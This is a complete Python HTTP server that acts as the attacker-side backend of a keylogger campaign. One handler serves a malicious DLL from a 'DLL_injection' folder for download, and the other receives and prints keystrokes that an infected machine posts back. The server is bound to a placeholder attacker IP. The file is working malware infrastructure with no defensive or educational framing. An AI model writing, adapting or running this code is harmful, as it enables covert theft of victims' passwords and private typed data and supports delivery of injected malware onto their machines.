from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# The path to your DLL file (adjust the path as needed)
dll_file_path = r"C:\Users\isteb\Documents\hector\scripts\DLL_injection\mydll.dll"

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve the DLL file for download if the URL path is "/mydll.dll"
        if self.path == "/mydll.dll":
            try:
                with open(dll_file_path, 'rb') as file:
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # Receive keystrokes sent from the keylogger DLL
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"Received keystrokes: {post_data.decode('utf-8')}")
        self.send_response(200)
        self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('<attacker_server_IP>', 8080), SimpleHTTPRequestHandler)
    print("Server listening on port 8080...")
    server.serve_forever()
